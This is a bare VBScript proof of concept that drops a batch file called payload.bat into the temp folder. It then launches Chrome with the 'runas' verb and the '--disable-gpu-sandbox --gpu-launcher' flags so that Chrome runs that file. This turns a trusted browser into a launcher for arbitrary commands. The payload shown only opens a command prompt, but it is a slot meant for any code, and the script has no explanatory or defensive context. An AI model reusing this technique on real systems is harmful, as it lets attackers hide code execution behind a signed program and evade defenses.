Set FSO = CreateObject("Scripting.FileSystemObject")
Set Shell = CreateObject("WScript.Shell")
Set App = CreateObject("Shell.Application")

Temp = Shell.expandEnvironmentStrings("%temp%") + "\payload.bat"
Payload = "echo :) && cmd"

Set File = FSO.CreateTextFile(Temp, true)
File.WriteLine(Payload)

App.ShellExecute "C:\Program Files\Google\Chrome\Application\chrome.exe", "--disable-gpu-sandbox --gpu-launcher=" + Temp, , "runas"
